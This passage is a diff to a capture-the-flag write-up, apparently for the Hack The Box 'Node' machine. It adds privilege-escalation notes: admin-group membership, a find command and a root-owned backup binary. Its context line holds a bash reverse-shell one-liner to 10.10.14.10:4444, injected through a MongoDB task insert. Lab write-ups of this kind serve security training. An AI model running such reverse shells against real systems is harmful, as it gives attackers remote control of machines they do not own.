@@ -208,7 +208,19 @@ db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'"})
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d0ba5da4-0ee6-4541-9d4e-12ec3eb812d9)
 
+## Privilege Escalation
++ Tom is in the admin group
++ Run [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)
++ Alternatively, run: `find / -group admin -ls 2>/dev/null`
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4cd5e45f-d178-4851-87bd-269c9a67b3c6)
+  
++ **/usr/local/bin/backup** looks to be owned by root and is in the admin group. 
+
+
+
+  
++ 
 
 # References & Alternatives:
 + https://0xdf.gitlab.io/2021/06/08/htb-node.html
